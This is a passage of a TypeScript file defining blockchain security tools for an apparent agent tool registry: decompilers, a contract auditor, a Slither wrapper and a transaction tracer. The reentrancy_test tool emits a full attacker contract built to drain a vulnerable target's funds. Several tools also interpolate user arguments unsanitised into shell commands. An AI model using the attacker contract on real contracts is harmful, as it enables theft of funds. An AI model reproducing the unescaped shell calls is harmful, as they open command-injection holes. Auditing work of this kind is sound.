import { z } from "zod";
import * as fs from "fs";
import * as child_process from "child_process";
import { ToolRegistry } from "./registry";

// 各链默认公共 RPC 节点
const CHAIN_RPC: Record<string, string> = {
  ethereum: "https://cloudflare-eth.com",
  bsc: "https://bsc-dataseed.binance.org",
  polygon: "https://polygon-rpc.com",
  arbitrum: "https://arb1.arbitrum.io/rpc",
  optimism: "https://mainnet.optimism.io",
};

// 各链对应的区块浏览器
const CHAIN_EXPLORER: Record<string, string> = {
  ethereum: "https://etherscan.io",
  bsc: "https://bscscan.com",
  polygon: "https://polygonscan.com",
  arbitrum: "https://arbiscan.io",
  optimism: "https://optimistic.etherscan.io",
};

/**
 * 查询 4byte.directory 解码函数选择器
 */
function lookupFunctionSelector(selector: string): string {
  try {
    const hex = selector.startsWith("0x") ? selector : "0x" + selector;
    const result = child_process.execSync(
      `curl -s "https://www.4byte.directory/api/v1/signatures/?hex_signature=${hex}"`,
      { timeout: 15000, encoding: "utf-8" }
    );
    const data = JSON.parse(result);
    if (data.results && data.results.length > 0) {
      return data.results.map((r: any) => r.text_signature).join(", ");
    }
    return "";
  } catch {
    return "";
  }
}

export function createBlockchainTools(): ToolRegistry {
  const registry = new ToolRegistry();

  registry.register({
    name: "sol_disassemble",
    description: "Solidity 源码反汇编/反编译：支持 disasm(反汇编)/decompile(反编译)/storage(存储布局) 三种模式",
    parameters: z.object({
      bytecode: z.string().optional().describe("0x 开头的 EVM 字节码 hex"),
      contract_path: z.string().optional().describe("合约文件路径"),
      mode: z.enum(["disasm", "decompile", "storage"]).optional().describe("模式：disasm/decompile/storage，默认 disasm"),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { bytecode, contract_path, mode = "disasm" } = args;

      // 读取合约源码（若提供路径）
      let sourceCode = "";
      if (contract_path) {
        if (!fs.existsSync(contract_path)) {
          return `❌ 文件不存在: ${contract_path}`;
        }
        try {
          sourceCode = fs.readFileSync(contract_path, "utf-8");
        } catch (err: any) {
          return `[读取失败] ${err.message}`;
        }
        if (!/pragma\s+solidity|contract\s+\w+|interface\s+\w+/i.test(sourceCode)) {
          return `[警告] ${contract_path} 似乎不是 Solidity 源码文件`;
        }
      }

      // ===== 模式：disasm 反汇编 =====
      if (mode === "disasm") {
        // 优先用 solc 编译源码获取字节码与汇编
        if (contract_path) {
          try {
            child_process.execSync("solc --version", { timeout: 10000, encoding: "utf-8" });
            const asm = child_process.execSync(
              `solc --bin --asm ${contract_path}`,
              { timeout: 30000, maxBuffer: 1024 * 1024, encoding: "utf-8" }
            );
            return `[Solidity 反汇编] ${contract_path} (solc --bin --asm)\n\n${asm}`;
          } catch (err: any) {
            if (/not found|command not found|ENOENT/i.test(err.message)) {
              return `[solc 未安装] 请先安装 Solidity 编译器:\n  macOS: brew install ethereum/ethereum/solidity\n  Linux: snap install solc\n  或使用在线编译器: https://remix.ethereum.org/\n  npm: npm install -g solc`;
            }
            return `[solc 编译失败] ${err.message}\n建议检查 pragma 版本与合约语法`;
          }
        }
        // 若只给了字节码，用 go-ethereum 的 evm disasm
        if (bytecode) {
          try {
            const hex = bytecode.startsWith("0x") ? bytecode.slice(2) : bytecode;
            const tmpFile = `/tmp/evm_bytecode_${Date.now()}.bin`;
            fs.writeFileSync(tmpFile, Buffer.from(hex, "hex"));
            const disasm = child_process.execSync(
              `evm disasm ${tmpFile}`,
              { timeout: 30000, maxBuffer: 1024 * 1024, encoding: "utf-8" }
            );
            try { fs.unlinkSync(tmpFile); } catch {}
            return `[EVM 反汇编] 字节码长度: ${hex.length / 2} 字节\n\n${disasm}`;
          } catch (err: any) {
            if (/not found|command not found|ENOENT/i.test(err.message)) {
              return `[evm 未安装] 请安装 go-ethereum 以获取 evm 工具:\n  macOS: brew install ethereum\n  Linux: sudo apt install ethereum\n  或使用在线反汇编: https://ethervm.io/`;
            }
            return `[反汇编失败] ${err.message}`;
          }
        }
        return `[错误] 请提供 contract_path 或 bytecode 参数`;
      }

      // ===== 模式：decompile 反编译 =====
      if (mode === "decompile") {
        // 优先尝试本地 panoramix
        try {
          const target = bytecode || contract_path;
          if (!target) return `[错误] 请提供 bytecode 或 contract_path`;
          const cmd = bytecode
            ? `panoramix ${bytecode.startsWith("0x") ? bytecode : "0x" + bytecode}`
            : `panoramix ${contract_path}`;
          const out = child_process.execSync(cmd, { timeout: 30000, maxBuffer: 1024 * 1024, encoding: "utf-8" });
          return `[反编译结果] (panoramix)\n\n${out}`;
        } catch (err: any) {
          if (/not found|command not found|ENOENT/i.test(err.message)) {
            const onlineUrls = [
              "  - Dedaub: https://app.dedaub.com/decompile",
              "  - Ethervm: https://ethervm.io/decompile",
              "  - Etherscan 反编译: https://etherscan.io/bytecode-decompiler",
            ];
            return `[panoramix 未安装] 请安装本地反编译器:\n  pip install panoramix\n或使用在线反编译服务:\n${onlineUrls.join("\n")}\n\n如已部署合约，可在浏览器中查看已验证源码。`;
          }
          return `[反编译失败] ${err.message}`;
        }
      }

      // ===== 模式：storage 存储布局分析 =====
      if (mode === "storage") {
        if (!contract_path) return `[错误] storage 模式需要 contract_path 参数`;
        // 尝试用 solc 输出存储布局
        try {
          child_process.execSync("solc --version", { timeout: 10000, encoding: "utf-8" });
          const layout = child_process.execSync(
            `solc --storage-layout ${contract_path}`,
            { timeout: 30000, maxBuffer: 1024 * 1024, encoding: "utf-8" }
          );
          return `[存储布局] ${contract_path} (solc --storage-layout)\n\n${layout}`;
        } catch (err: any) {
          if (/not found|command not found|ENOENT/i.test(err.message)) {
            // solc 不存在时，用正则从源码简单推断状态变量与 slot
            const slots: string[] = [];
            const varRegex = /(uint|int|bool|address|bytes|string|mapping|\w+)\s+(?:public\s+|private\s+|internal\s+)?(\w+)\s*(?:=|;|\[)/g;
            let slot = 0;
            let m: RegExpExecArray | null;
            while ((m = varRegex.exec(sourceCode)) !== null) {
              const type = m[1];
              const name = m[2];
              if (["uint", "int", "bool", "address", "bytes", "string", "mapping"].includes(type) || /^[A-Z]/.test(type)) {
                slots.push(`  slot ${slot}: ${type} ${name}`);
                slot++;
              }
            }
            return `[存储布局] ${contract_path} (源码推断 - solc 未安装)\n\n状态变量:\n${slots.length ? slots.join("\n") : "  (未识别到状态变量)"}\n\n提示: 安装 solc 可获取精确存储布局: brew install ethereum/ethereum/solidity`;
          }
          return `[存储布局分析失败] ${err.message}`;
        }
      }

      return `[错误] 未知模式: ${mode}`;
    },
  });

  registry.register({
    name: "evm_decompile",
    description: "EVM 字节码反编译：尝试本地工具反编译并提供在线反编译链接，解析函数选择器与事件签名",
    parameters: z.object({
      bytecode: z.string().describe("0x 开头的 EVM 字节码 hex"),
      decompiler: z.enum(["panoramix", "ethervm", "dedaub", "auto"]).optional().describe("反编译器选择，默认 auto"),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { bytecode, decompiler = "auto" } = args;
      const hex = bytecode.startsWith("0x") ? bytecode.slice(2) : bytecode;

      if (!hex || hex.length < 4) {
        return `[错误] 无效字节码`;
      }

      const sections: string[] = [];
      sections.push(`[EVM 反编译] 字节码长度: ${hex.length / 2} 字节`);

      // 提取函数选择器（PUSH4 0x 选择器 模式: 63xxxxxxxx4e ...）
      const selectors: string[] = [];
      const push4Regex = /63([0-9a-f]{8})14/g;
      let m: RegExpExecArray | null;
      const seen = new Set<string>();
      while ((m = push4Regex.exec(hex)) !== null) {
        const sel = m[1];
        if (!seen.has(sel)) {
          seen.add(sel);
          selectors.push(sel);
        }
      }
      // 也尝试从字节码中找其他 PUSH4 模式
      const push4Alt = /63([0-9a-f]{8})/g;
      while ((m = push4Alt.exec(hex)) !== null) {
        const sel = m[1];
        if (!seen.has(sel)) {
          seen.add(sel);
          selectors.push(sel);
        }
      }

      // 提取事件签名 topic（PUSH32）
      const topics: string[] = [];
      const push32Regex = /7f([0-9a-f]{64})/g;
      const seenTopic = new Set<string>();
      while ((m = push32Regex.exec(hex)) !== null) {
        const topic = m[1];
        if (!seenTopic.has(topic)) {
          seenTopic.add(topic);
          topics.push(topic);
        }
      }

      // 解析函数选择器（用 4byte.directory）
      if (selectors.length > 0) {
        const decoded: string[] = [];
        for (const sel of selectors.slice(0, 20)) {
          const sig = lookupFunctionSelector(sel);
          decoded.push(`  0x${sel}: ${sig || "(未在 4byte.directory 中找到)"}`);
        }
        sections.push(`\n函数选择器 (${selectors.length} 个):\n${decoded.join("\n")}`);
      } else {
        sections.push(`\n未识别到函数选择器`);
      }

      // 事件 topic
      if (topics.length > 0) {
        sections.push(`\n事件 Topic (${topics.length} 个):\n${topics.slice(0, 10).map((t) => `  0x${t}`).join("\n")}`);
      }

      // 尝试本地反编译
      const tryDecompile = (tool: string, cmd: string): string | null => {
        try {
          const out = child_process.execSync(cmd, { timeout: 30000, maxBuffer: 1024 * 1024, encoding: "utf-8" });
          return out;
        } catch (err: any) {
          if (/not found|command not found|ENOENT/i.test(err.message)) return null;
          return `[${tool} 错误] ${err.message}`;
        }
      };

      let decompiled: string | null = null;
      if (decompiler === "panoramix" || decompiler === "auto") {
        decompiled = tryDecompile("panoramix", `panoramix 0x${hex}`);
        if (decompiled) sections.push(`\n===== panoramix 反编译结果 =====\n${decompiled}`);
      }

      // 在线反编译链接
      const onlineUrls: string[] = [];
      if (decompiler === "dedaub" || (decompiler === "auto" && !decompiled)) {
        onlineUrls.push("  - Dedaub 反编译: https://app.dedaub.com/decompile");
      }
      if (decompiler === "ethervm" || (decompiler === "auto" && !decompiled)) {
        onlineUrls.push("  - Ethervm 反编译: https://ethervm.io/decompile");
      }
      if (decompiler === "auto" && !decompiled) {
        onlineUrls.push("  - Etherscan 反编译: https://etherscan.io/bytecode-decompiler");
        onlineUrls.push("\n  安装本地反编译器: pip install panoramix");
      }
      if (onlineUrls.length > 0) {
        sections.push(`\n在线反编译建议:\n${onlineUrls.join("\n")}`);
      }

      return sections.join("\n");
    },
  });

  registry.register({
    name: "contract_audit",
    description: "智能合约漏洞审计：检测整数溢出/重入/访问控制/随机数/tx.origin 等常见漏洞",
    parameters: z.object({
      contract_path: z.string().describe("合约 .sol 文件路径"),
      checks: z.array(z.string()).optional().describe('检查项: overflow/reentrancy/access_control/randomness/tx_origin/timestamp_dep，默认全部'),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { contract_path, checks } = args;

      if (!fs.existsSync(contract_path)) {
        return `❌ 文件不存在: ${contract_path}`;
      }

      let source: string;
      try {
        source = fs.readFileSync(contract_path, "utf-8");
      } catch (err: any) {
        return `[读取失败] ${err.message}`;
      }

      const allChecks = ["overflow", "reentrancy", "access_control", "randomness", "tx_origin", "timestamp_dep"];
      const activeChecks = checks && checks.length > 0 ? checks : allChecks;

      const findings: string[] = [];
      const lines = source.split("\n");

      // 检测 Solidity 版本（>=0.8.0 默认有溢出检查）
      const pragmaMatch = source.match(/pragma\s+solidity\s+[\^~]?(\d+)\.(\d+)\.(\d+)/);
      const hasOverflowProtection = pragmaMatch && (parseInt(pragmaMatch[1]) > 0 || parseInt(pragmaMatch[2]) >= 8);
      const usesSafeMath = /using\s+SafeMath/i.test(source);

      // ===== 整数溢出检测 =====
      if (activeChecks.includes("overflow")) {
        if (hasOverflowProtection) {
          findings.push(`[✅ 低危] 整数溢出: Solidity ${pragmaMatch ? pragmaMatch[0] : ""} 默认启用溢出检查`);
        } else if (usesSafeMath) {
          findings.push(`[✅ 低危] 整数溢出: 已使用 SafeMath`);
        } else {
          // 查找未使用 SafeMath 的算术运算
          const arithRegex = /(\w+)\s*([+\-*\/])=\s*|\+\+|--|(\w+)\s*([+\-*\/])\s*(\w+)/g;
          let am: RegExpExecArray | null;
          let arithCount = 0;
          let arithLines: string[] = [];
          while ((am = arithRegex.exec(source)) !== null) {
            arithCount++;
            if (arithLines.length < 5) {
              const lineNum = source.slice(0, am.index).split("\n").length;
              arithLines.push(`    L${lineNum}: ${lines[lineNum - 1]?.trim()}`);
            }
          }
          if (arithCount > 0) {
            findings.push(`[⚠️ 高危] 整数溢出: 检测到 ${arithCount} 处算术运算，未使用 SafeMath 且 Solidity < 0.8.0`);
            findings.push(...arithLines);
            findings.push(`  修复建议: 使用 OpenZeppelin SafeMath 或升级到 Solidity >= 0.8.0`);
          }
        }
      }

      // ===== 重入风险检测 =====
      if (activeChecks.includes("reentrancy")) {
        const extCallRegex = /\.call\s*\{|\.call\.value\s*\(|\.send\s*\(|\.transfer\s*\(/g;
        let em: RegExpExecArray | null;
        while ((em = extCallRegex.exec(source)) !== null) {
          const lineNum = source.slice(0, em.index).split("\n").length;
          // 检查外部调用后是否有状态修改（简化：检查后续 10 行是否有赋值）
          const followingLines = lines.slice(lineNum, Math.min(lineNum + 10, lines.length)).join("\n");
          if (/[=]\s*[^=]/.test(followingLines) || /balances|balanceOf|_balances/i.test(followingLines)) {
            findings.push(`[🔴 严重] 重入风险: L${lineNum} 外部调用后修改状态`);
            findings.push(`    ${lines[lineNum - 1]?.trim()}`);
            findings.push(`  修复建议: 使用 checks-effects-interactions 模式 或 ReentrancyGuard`);
          }
        }
      }

      // ===== 访问控制缺失检测 =====
      if (activeChecks.includes("access_control")) {
        // 查找 public/external 函数未带 modifier
        const funcRegex = /function\s+(\w+)\s*\([^)]*\)\s*(public|external)([^;{]*)([;{])/g;
        let fm: RegExpExecArray | null;
        while ((fm = funcRegex.exec(source)) !== null) {
          const funcName = fm[1];
          const rest = fm[3];
          // 排除 view/pure 函数
          if (/view|pure|constant/i.test(rest)) continue;
          // 检查是否有 onlyOwner/onlyRole/modifier
          if (/onlyOwner|onlyRole|onlyAdmin|modifier|require\s*\(\s*msg\.sender\s*==\s*owner/i.test(rest)) continue;
          const lineNum = source.slice(0, fm.index).split("\n").length;
          // 排除 constructor/fallback/receive
          if (/constructor|fallback|receive/i.test(funcName)) continue;
          findings.push(`[⚠️ 中危] 访问控制缺失: L${lineNum} function ${funcName}() ${fm[2]} 缺少权限修饰符`);
          findings.push(`    ${lines[lineNum - 1]?.trim()}`);
          findings.push(`  修复建议: 添加 onlyOwner modifier 或 require(msg.sender == owner) 检查`);
        }
      }

      // ===== 随机数预测检测 =====
      if (activeChecks.includes("randomness")) {
        const randomRegex = /block\.timestamp|blockhash\s*\(|block\.difficulty|block\.number/g;
        let rm: RegExpExecArray | null;
        while ((rm = randomRegex.exec(source)) !== null) {
          const lineNum = source.slice(0, rm.index).split("\n").length;
          const ctx = lines[lineNum - 1]?.trim() || "";
          // 排除非随机用途（如时间限制）
          if (/deadline|expire|timeLimit|block\.timestamp\s*[<>=]/i.test(ctx)) continue;
          findings.push(`[⚠️ 高危] 随机数预测: L${lineNum} 使用 ${rm[0]} 作为随机源`);
          findings.push(`    ${ctx}`);
          findings.push(`  修复建议: 使用 Chainlink VRF 或 commit-reveal 方案生成随机数`);
        }
      }

      // ===== tx.origin 检测 =====
      if (activeChecks.includes("tx_origin")) {
        const txOriginRegex = /tx\.origin/g;
        let tm: RegExpExecArray | null;
        while ((tm = txOriginRegex.exec(source)) !== null) {
          const lineNum = source.slice(0, tm.index).split("\n").length;
          findings.push(`[🔴 严重] tx.origin 钓鱼风险: L${lineNum} 使用 tx.origin 做权限检查`);
          findings.push(`    ${lines[lineNum - 1]?.trim()}`);
          findings.push(`  修复建议: 使用 msg.sender 替代 tx.origin`);
        }
      }

      // ===== 时间戳依赖检测 =====
      if (activeChecks.includes("timestamp_dep")) {
        const tsRegex = /now\b|block\.timestamp/g;
        let tsm: RegExpExecArray | null;
        const reported = new Set<number>();
        while ((tsm = tsRegex.exec(source)) !== null) {
          const lineNum = source.slice(0, tsm.index).split("\n").length;
          if (reported.has(lineNum)) continue;
          reported.add(lineNum);
          const ctx = lines[lineNum - 1]?.trim() || "";
          if (/deadline|expire|timeLimit|[<>]=?\s*\d+/.test(ctx)) continue;
          findings.push(`[ℹ️ 低危] 时间戳依赖: L${lineNum} 使用 ${tsm[0]} 矿工可在 ~15s 范围内操控`);
          findings.push(`    ${ctx}`);
        }
      }

      // 汇总
      const highCount = findings.filter((f) => f.includes("[🔴 严重]") || f.includes("[⚠️ 高危]")).length;
      const medCount = findings.filter((f) => f.includes("[⚠️ 中危]")).length;
      const lowCount = findings.filter((f) => f.includes("[ℹ️ 低危]") || f.includes("[✅ 低危]")).length;

      const header = `[合约审计报告] ${contract_path}\nSolidity 版本: ${pragmaMatch ? pragmaMatch[0] : "未声明"}\n检查项: ${activeChecks.join(", ")}\n\n统计: 严重/高危 ${highCount} | 中危 ${medCount} | 低危 ${lowCount}\n`;

      return findings.length > 0
        ? `${header}\n${"=".repeat(60)}\n${findings.join("\n")}`
        : `${header}\n未发现明显漏洞，建议配合 slither/mythril 做进一步分析`;
    },
  });

  registry.register({
    name: "reentrancy_test",
    description: "重入攻击检测与 PoC 生成：静态分析外部调用后的状态修改并生成攻击合约代码",
    parameters: z.object({
      contract_path: z.string().describe("合约文件路径"),
      function_name: z.string().optional().describe("可疑函数名，不填则扫描全部"),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { contract_path, function_name } = args;

      if (!fs.existsSync(contract_path)) {
        return `❌ 文件不存在: ${contract_path}`;
      }

      let source: string;
      try {
        source = fs.readFileSync(contract_path, "utf-8");
      } catch (err: any) {
        return `[读取失败] ${err.message}`;
      }

      const lines = source.split("\n");
      const risks: string[] = [];

      // 提取合约名
      const contractMatch = source.match(/contract\s+(\w+)/);
      const contractName = contractMatch ? contractMatch[1] : "TargetContract";

      // 检测危险外部调用模式
      const patterns = [
        { regex: /\.call\s*\{\s*value:/g, desc: ".call{value:}() 低级调用" },
        { regex: /\.call\.value\s*\(/g, desc: ".call.value() 旧式调用" },
        { regex: /\.call\s*\(/g, desc: ".call() 低级调用" },
        { regex: /\.send\s*\(/g, desc: ".send() 调用" },
      ];

      // 查找 withdraw 类函数
      const funcRegex = /function\s+(\w+)\s*\(([^)]*)\)[^{]*\{/g;
      let fm: RegExpExecArray | null;
      const suspiciousFuncs: { name: string; line: number; body: string }[] = [];

      while ((fm = funcRegex.exec(source)) !== null) {
        const fname = fm[1];
        const funcStart = fm.index;
        const lineNum = source.slice(0, funcStart).split("\n").length;

        if (function_name && fname !== function_name) continue;

        // 提取函数体（简化：匹配大括号）
        let braceCount = 1;
        let bodyEnd = funcStart + fm[0].length;
        for (let i = bodyEnd; i < source.length && braceCount > 0; i++) {
          if (source[i] === "{") braceCount++;
          if (source[i] === "}") braceCount--;
          bodyEnd = i;
        }
        const funcBody = source.slice(funcStart, bodyEnd + 1);

        // 检测函数体内是否有外部调用 + 后续状态修改
        let hasExternalCall = false;
        let callLine = 0;
        let callDesc = "";
        for (const p of patterns) {
          const pRegex = new RegExp(p.regex.source, p.regex.flags);
          const cm = pRegex.exec(funcBody);
          if (cm) {
            hasExternalCall = true;
            callLine = lineNum + funcBody.slice(0, cm.index).split("\n").length - 1;
            callDesc = p.desc;
            break;
          }
        }

        if (hasExternalCall) {
          // 检查外部调用之后是否有余额修改
          const callIdx = funcBody.indexOf(callDesc.includes("value") ? "call" : "call");
          const afterCall = funcBody.slice(callIdx);
          const hasStateChange = /balances|balanceOf|_balances|\.balance|msg\.sender|=\s*[^=]/i.test(afterCall);
          const isWithdraw = /withdraw|withdraw|transfer|send|claim|refund|cash/i.test(fname);

          if (hasStateChange || isWithdraw) {
            suspiciousFuncs.push({ name: fname, line: callLine, body: funcBody });
            risks.push(`[🔴 严重] 函数 ${fname}() L${callLine} 存在重入风险`);
            risks.push(`  外部调用方式: ${callDesc}`);
            risks.push(`  代码: ${lines[callLine - 1]?.trim()}`);
            risks.push(`  风险: 外部调用后状态可被恶意合约递归调用修改`);
            risks.push(`  修复: 使用 checks-effects-interactions 模式 或 ReentrancyGuard`);
            risks.push("");
          }
        }
      }

      // 生成 PoC 攻击合约
      let poc = "";
      if (suspiciousFuncs.length > 0) {
        const targetFunc = suspiciousFuncs[0];
        poc = `\n${"=".repeat(60)}\n[PoC 攻击合约]\n${"=".repeat(60)}\n
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface I${contractName} {
    function ${targetFunc.name}() external payable;
    function deposit() external payable;
}

contract ReentrancyAttacker {
    I${contractName} public target;
    address public owner;

    constructor(address _target) {
        target = I${contractName}(_target);
        owner = msg.sender;
    }

    // 攻击入口：先存入资金，再触发提款
    function attack() external payable {
        require(msg.value >= 1 ether, "需要初始资金");
        target.deposit{value: msg.value}();
        target.${targetFunc.name}();  // 触发目标合约向本合约转账
    }

    // 重入入口：目标合约向本合约转账时触发 fallback
    receive() external payable {
        // 持续调用目标函数直到余额耗尽
        if (address(target).balance >= msg.value) {
            target.${targetFunc.name}();
        }
    }

    // 提取盗取的资金
    function withdraw() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}`;
      }

      const header = `[重入检测] ${contract_path}${function_name ? ` (函数: ${function_name})` : ""}\n${"=".repeat(60)}\n`;

      if (risks.length === 0) {
        return `${header}未检测到明显重入风险模式\n\n建议: 配合 slither --detect reentrancy 做更精确分析`;
      }

      return `${header}${risks.join("\n")}${poc}`;
    },
  });

  registry.register({
    name: "slither_scan",
    description: "Slither 静态分析：运行 Slither 检测 Solidity 合约漏洞与优化建议",
    parameters: z.object({
      contract_path: z.string().describe("合约文件或目录路径"),
      solc_version: z.string().optional().describe("Solidity 版本如 0.8.0"),
      detectors: z.string().optional().describe('检测器过滤如 "reentrancy,access-control"'),
      output_format: z.enum(["text", "json"]).optional().describe("输出格式，默认 text"),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { contract_path, solc_version, detectors, output_format = "text" } = args;

      if (!fs.existsSync(contract_path)) {
        return `❌ 文件不存在: ${contract_path}`;
      }

      // 检查 slither 是否安装
      try {
        const version = child_process.execSync("slither --version", { timeout: 10000, encoding: "utf-8" });
        // 构造命令
        const parts: string[] = ["slither", contract_path];

        if (solc_version) {
          parts.push(`--solc-args "--allow-paths ."` );
          // 通过 solc-select 切换版本（如果可用）
        }
        if (detectors) {
          parts.push(`--detect ${detectors}`);
        }
        if (output_format === "json") {
          parts.push("--json");
        }

        const cmd = parts.join(" ");
        const result = child_process.execSync(cmd, { timeout: 30000, maxBuffer: 1024 * 1024, encoding: "utf-8" });
        return `[Slither 扫描] ${contract_path}\nslither 版本: ${version.trim()}\n${"=".repeat(60)}\n${result}`;
      } catch (err: any) {
        if (/not found|command not found|ENOENT/i.test(err.message)) {
          return `[slither 未安装] 请安装 Slither 静态分析器:\n  pip install slither-analyzer\n  或: pipx install slither-analyzer\n\n依赖:\n  - Python 3.8+\n  - solc (Solidity 编译器)\n  - 可选: solc-select (管理多版本 solc)\n    pip install solc-select && solc-select install 0.8.0 && solc-select use 0.8.0\n\n在线替代方案:\n  - Remix IDE: https://remix.ethereum.org/\n  - MythX: https://mythx.io/`;
        }
        // slither 已安装但执行失败（可能有漏洞检出，slither 非零退出）
        const stdout = err.stdout ? String(err.stdout) : "";
        const stderr = err.stderr ? String(err.stderr) : "";
        let out = `[Slither 扫描] ${contract_path}\n${"=".repeat(60)}\n`;
        if (stdout) out += stdout;
        if (stderr) out += `\n[stderr]\n${stderr}`;
        if (!stdout && !stderr) out += `[错误] ${err.message}`;
        out += `\n\n提示: slither 检测到问题时会返回非零退出码，上述输出即检测结果。`;
        return out;
      }
    },
  });

  registry.register({
    name: "tx_trace_analyze",
    description: "链上交易 trace 分析：解析 internal calls、状态变更、event logs，用 4byte.directory 解码函数选择器",
    parameters: z.object({
      tx_hash: z.string().describe("交易哈希"),
      rpc_url: z.string().optional().describe("RPC 节点 URL，默认用公共节点"),
      chain: z.enum(["ethereum", "bsc", "polygon", "arbitrum", "optimism"]).optional().describe("链，默认 ethereum"),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { tx_hash, rpc_url, chain = "ethereum" } = args;
      const url = rpc_url || CHAIN_RPC[chain] || CHAIN_RPC.ethereum;
      const explorer = CHAIN_EXPLORER[chain] || CHAIN_EXPLORER.ethereum;

      const sections: string[] = [];
      sections.push(`[交易 Trace 分析] ${tx_hash}`);
      sections.push(`链: ${chain} | RPC: ${url}`);
      sections.push(`浏览器: ${explorer}/tx/${tx_hash}`);
      sections.push("=".repeat(60));

      // 1. 获取交易详情
      let txDetail: any = null;
      try {
        const payload = JSON.stringify({
          jsonrpc: "2.0",
          method: "eth_getTransactionByHash",
          params: [tx_hash],
          id: 1,
        });
        const res = child_process.execSync(
          `curl -s -X POST -H "Content-Type: application/json" --data '${payload}' ${url}`,
          { timeout: 15000, encoding: "utf-8" }
        );
        const data = JSON.parse(res);
        txDetail = data.result;
      } catch (err: any) {
        sections.push(`[获取交易详情失败] ${err.message}`);
      }

      if (txDetail) {
        sections.push(`\n[交易详情]`);
        sections.push(`  from: ${txDetail.from}`);
        sections.push(`  to: ${txDetail.to || "(合约创建)"}`);
        sections.push(`  value: ${txDetail.value} wei (${parseInt(txDetail.value || "0x0", 16) / 1e18} ETH)`);
        sections.push(`  gas: ${parseInt(txDetail.gas || "0x0", 16)}`);
        sections.push(`  gasPrice: ${parseInt(txDetail.gasPrice || "0x0", 16)} wei`);
        sections.push(`  nonce: ${parseInt(txDetail.nonce || "0x0", 16)}`);
        sections.push(`  blockNumber: ${txDetail.blockNumber}`);
        sections.push(`  input: ${txDetail.input ? txDetail.input.slice(0, 74) + (txDetail.input.length > 74 ? "..." : "") : "0x"}`);

        // 解码 input 中的函数选择器
        if (txDetail.input && txDetail.input.length >= 10) {
          const selector = txDetail.input.slice(0, 10);
          const sig = lookupFunctionSelector(selector);
          sections.push(`  函数选择器: ${selector} → ${sig || "(未识别)"}`);
        }
      }

      // 2. 获取交易回执（含 logs）
      let receipt: any = null;
      try {
        const payload = JSON.stringify({
          jsonrpc: "2.0",
          method: "eth_getTransactionReceipt",
          params: [tx_hash],
          id: 2,
        });
        const res = child_process.execSync(
          `curl -s -X POST -H "Content-Type: application/json" --data '${payload}' ${url}`,
          { timeout: 15000, encoding: "utf-8" }
        );
        const data = JSON.parse(res);
        receipt = data.result;
      } catch (err: any) {
        sections.push(`[获取回执失败] ${err.message}`);
      }

      if (receipt) {
        sections.push(`\n[交易回执]`);
        sections.push(`  status: ${receipt.status === "0x1" ? "✅ 成功" : "❌ 失败"}`);
        sections.push(`  gasUsed: ${parseInt(receipt.gasUsed || "0x0", 16)}`);
        sections.push(`  contractAddress: ${receipt.contractAddress || "(无)"}`);

        // 解析 event logs
        if (receipt.logs && receipt.logs.length > 0) {
          sections.push(`\n[Event Logs] (${receipt.logs.length} 条)`);
          receipt.logs.slice(0, 10).forEach((log: any, i: number) => {
            sections.push(`  [${i}] address: ${log.address}`);
            if (log.topics && log.topics.length > 0) {
              const eventSig = log.topics[0];
              const sig = lookupFunctionSelector(eventSig.slice(0, 10));
              sections.push(`      event: ${eventSig.slice(0, 10)} → ${sig || "(未知事件)"}`);
              log.topics.slice(1).forEach((t: string, j: number) => {
                sections.push(`      topic[${j + 1}]: ${t}`);
              });
            }
            if (log.data && log.data !== "0x") {
              sections.push(`      data: ${log.data.slice(0, 66)}${log.data.length > 66 ? "..." : ""}`);
            }
          });
          if (receipt.logs.length > 10) {
            sections.push(`  ... 还有 ${receipt.logs.length - 10} 条 log`);
          }
        }
      }

      // 3. 尝试获取 debug trace（部分公共节点不支持）
      try {
        const payload = JSON.stringify({
          jsonrpc: "2.0",
          method: "debug_traceTransaction",
          params: [tx_hash, { tracer: "callTracer" }],
          id: 3,
        });
        const res = child_process.execSync(
          `curl -s -X POST -H "Content-Type: application/json" --data '${payload}' ${url}`,
          { timeout: 15000, encoding: "utf-8" }
        );
        const data = JSON.parse(res);
        if (data.result && !data.error) {
          sections.push(`\n[Internal Calls Trace] (debug_traceTransaction)`);
          const trace = data.result;
          const renderCall = (call: any, depth: number): string => {
            const indent = "  ".repeat(depth + 1);
            let line = `${indent}type: ${call.type || "?"} | from: ${call.from || "?"} | to: ${call.to || "?"}`;
            if (call.value) line += ` | value: ${parseInt(call.value, 16) / 1e18} ETH`;
            if (call.input && call.input.length >= 10) {
              const sel = call.input.slice(0, 10);
              line += ` | call: ${sel}`;
            }
            const childLines: string[] = [line];
            if (call.calls) {
              for (const c of call.calls.slice(0, 5)) {
                childLines.push(renderCall(c, depth + 1));
              }
              if (call.calls.length > 5) {
                childLines.push(`${"  ".repeat(depth + 2)}... (${call.calls.length - 5} 个更多调用)`);
              }
            }
            return childLines.join("\n");
          };
          sections.push(renderCall(trace, 0));
        } else if (data.error) {
          sections.push(`\n[debug_traceTransaction 不可用] ${data.error.message || "节点不支持 trace 方法"}`);
          sections.push(`提示: 公共节点通常不开放 debug_* 方法，请使用付费 RPC 或归档节点`);
        }
      } catch (err: any) {
        sections.push(`\n[trace 获取失败] ${err.message}`);
      }

      return sections.join("\n");
    },
  });

  registry.register({
    name: "rpc_query",
    description: "以太坊 JSON-RPC 查询：支持 eth_getBalance/eth_getCode/eth_getStorageAt/eth_call 等方法",
    parameters: z.object({
      method: z.string().describe("JSON-RPC 方法名如 eth_getBalance/eth_getCode/eth_getStorageAt/eth_call"),
      address: z.string().optional().describe("合约或钱包地址"),
      block: z.string().optional().describe("区块号或 latest，默认 latest"),
      params: z.string().optional().describe("额外参数 JSON 字符串"),
      rpc_url: z.string().optional().describe("RPC URL"),
      chain: z.enum(["ethereum", "bsc", "polygon", "arbitrum", "optimism"]).optional().describe("链，默认 ethereum"),
    }),
    category: "blockchain",
    concurrent: true,
    execute: async (args: any) => {
      const { method, address, block = "latest", params, rpc_url, chain = "ethereum" } = args;
      const url = rpc_url || CHAIN_RPC[chain] || CHAIN_RPC.ethereum;

      // 根据方法构造参数
      let rpcParams: any[] = [];
      let extraInfo = "";

      switch (method) {
        case "eth_getBalance":
